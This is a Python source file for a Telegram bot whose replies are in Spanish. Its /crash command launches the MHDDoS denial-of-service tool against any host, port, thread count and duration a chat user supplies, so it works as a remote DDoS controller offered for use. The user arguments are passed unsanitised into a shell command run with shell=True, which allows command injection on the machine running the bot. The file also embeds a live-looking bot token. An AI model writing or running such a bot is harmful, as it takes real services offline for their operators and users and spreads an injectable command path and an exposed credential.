from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
import subprocess

def start(update, context):
    update.message.reply_text('¡Hola! Soy tu nuevo bot. Usa /crash <TYPE> <IP/HOST:PORT> <THREADS> <MS> para iniciar un ataque.')

def crash(update, context):
    if len(context.args) != 4:
        update.message.reply_text('Uso: /crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>')
        return
    tipo, ip_port, threads, ms = context.args
    command = f"python3 /path/to/MHDDoS/start.py {tipo} {ip_port} {threads} {ms}"
    subprocess.Popen(command, shell=True)
    update.message.reply_text(f'Iniciando ataque {tipo} a {ip_port} con {threads} threads y {ms} ms.')

def main():
    updater = Updater("7541629213:AAFYvA-cJU6OxyMf33dC4SZxhh062-EmM00", use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("crash", crash))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
